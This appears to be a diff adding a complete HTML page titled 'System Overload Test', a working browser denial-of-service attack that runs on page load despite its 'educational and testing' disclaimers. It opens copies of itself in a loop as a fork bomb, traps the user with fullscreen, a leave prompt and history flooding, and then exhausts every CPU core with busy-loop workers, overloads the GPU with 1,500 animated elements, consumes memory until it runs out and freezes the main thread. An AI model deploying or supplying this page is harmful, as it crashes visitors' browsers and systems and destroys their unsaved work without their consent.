@@ -1,0 +1,129 @@
+<!-- WARNING: EXTREMELY AGGRESSIVE SCRIPT -->
+<!-- This file is for educational and testing purposes ONLY. -->
+<!-- Running this will almost certainly freeze and crash your browser. -->
+<!-- It may cause your entire operating system to become unstable, requiring a forced restart. -->
+<!-- You may lose unsaved work in other applications. -->
+<!-- DO NOT use this for malicious purposes. PROCEED AT YOUR OWN RISK. -->
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>System Overload Test</title>
+        <style>
+            /* This CSS is for the GPU overload portion. */
+            body {
+                background-color: #000;
+                overflow: hidden; /* Hide scrollbars that might appear */
+            }
+            .gpu-particle {
+                width: 5px;
+                height: 5px;
+                position: absolute;
+                border-radius: 50%;
+                /* Extremely demanding animation properties */
+                animation: gpu-killer 3s infinite alternate ease-in-out;
+            }
+            @keyframes gpu-killer {
+                0% {
+                    transform: scale(1) rotate(0deg) translate(-50%, -50%);
+                    box-shadow: 0 0 40px 20px hsla(180, 100%, 50%, 1);
+                    filter: blur(5px) hue-rotate(0deg);
+                }
+                100% {
+                    transform: scale(2) rotate(360deg) translate(-50%, -50%);
+                    box-shadow: 0 0 80px 40px hsla(300, 100%, 50%, 1);
+                    filter: blur(10px) hue-rotate(360deg) saturate(200%);
+                }
+            }
+        </style>
+        <script>
+            // --- SCRIPT BLOCK 1: IMMEDIATE ACTIONS ---
+            // These must run instantly before the page freezes.
+
+            // 1. Exponential Duplication (The Fork Bomb)
+            // Immediately attempt to open more copies of this page.
+            (function () {
+                const currentURL = window.location.href;
+                // Increase this number for more aggressive duplication.
+                for (let i = 0; i < 4; i++) {
+                    window.open(currentURL, "_blank");
+                    window.open(currentURL, "_blank", 'popup=true,width=1,height=1,scrollbar=no,resizable=no');
+                }
+            })();
+
+            // 2. UI Annoyances
+            (function () {
+                // Attempt to go fullscreen to hide browser UI.
+                document.documentElement.requestFullscreen().catch(() => {});
+
+                // Add the "Are you sure you want to leave?" prompt.
+                // This may require user interaction with the page to work in most modern browsers.
+                window.addEventListener('beforeunload', (e) => {
+                    e.preventDefault();
+                    e.returnValue = 'Are you sure you want to exit?';
+                    return e.returnValue;
+                });
+
+                // Flood browser history to make the "back" button useless.
+                try {
+                    for (let i = 0; i < 100; i++) {
+                        history.pushState(null, '', '#' + Math.random());
+                    }
+                } catch(e) {}
+            })();
+        </script>
+    </head>
+    <body>
+        <script>
+            // --- SCRIPT BLOCK 2: DEFERRED RESOURCE ATTACK ---
+            // We use a short timeout to let the duplication script run first.
+
+            setTimeout(() => {
+                // 3. Multi-Core CPU Overload (Web Workers)
+                try {
+                    const coreCount = navigator.hardwareConcurrency || 4; // Target all available cores
+                    const workerScript = `while (true) {}`;
+                    const blob = new Blob([workerScript], { type: 'application/javascript' });
+                    const workerURL = URL.createObjectURL(blob);
+                    for (let i = 0; i < coreCount; i++) {
+                        new Worker(workerURL);
+                    }
+                } catch(e) {}
+
+                // 4. GPU Overload (Intense CSS Animations)
+                try {
+                    const fragment = document.createDocumentFragment();
+                    for (let i = 0; i < 1500; i++) { // 1500 demanding elements
+                        const div = document.createElement("div");
+                        div.className = "gpu-particle";
+                        div.style.left = `${Math.random() * 100}vw`;
+                        div.style.top = `${Math.random() * 100}vh`;
+                        div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                        div.style.animationDelay = `${Math.random() * -3}s`;
+                        fragment.appendChild(div);
+                    }
+                    document.body.appendChild(fragment);
+                } catch(e) {}
+
+                // 5. Aggressive Memory (RAM) Consumption
+                try {
+                    const memoryHog = [];
+                    while (true) {
+                        const canvas = document.createElement("canvas");
+                        canvas.width = 4000;
+                        canvas.height = 4000; // Slightly smaller to allocate faster
+                        const ctx = canvas.getContext('2d');
+                        ctx.fillRect(0, 0, canvas.width, canvas.height);
+                        memoryHog.push(canvas.toDataURL()); // Store data to prevent garbage collection
+                    }
+                } catch(e) {}
+
+                // 6. Main Thread Freeze (The Final Blow)
+                // This is last, as it will halt all other script execution in this tab.
+                while (true) {}
+
+            }, 25); // 25ms delay is enough for window.open to fire
+        </script>
+    </body>
+</html>
